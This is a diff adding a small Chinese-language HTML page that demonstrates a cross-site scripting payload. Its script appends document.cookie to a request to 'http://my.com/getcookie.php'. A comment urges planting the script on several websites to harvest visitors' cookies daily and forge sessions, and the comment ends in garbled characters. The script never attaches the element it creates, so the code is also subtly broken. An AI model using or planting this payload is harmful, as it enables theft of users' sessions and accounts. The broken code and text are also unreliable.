@@ -1,0 +1,25 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="zh-CN">
+<head>
+<title>新建网页</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+<script type="text/javascript">
+
+</script>
+
+<style type="text/css">
+</style>
+</head>
+    <body>
+        <h2>XX网站,被嵌入了一些恶意脚本</h2>
+
+        <script type="text/javascript">
+            var js = document.createElement('script');
+            js.src = 'http://my.com/getcookie.php?' + document.cookie;
+            // 上面这句话,就把被入侵网站的cookie,发送到了getcookie.php,
+            // 你可以挂上几个网站,每天就等着接别人的cookie,伪造...#%(WPITREPOPWR
+        </script>
+    </body>
+</html>
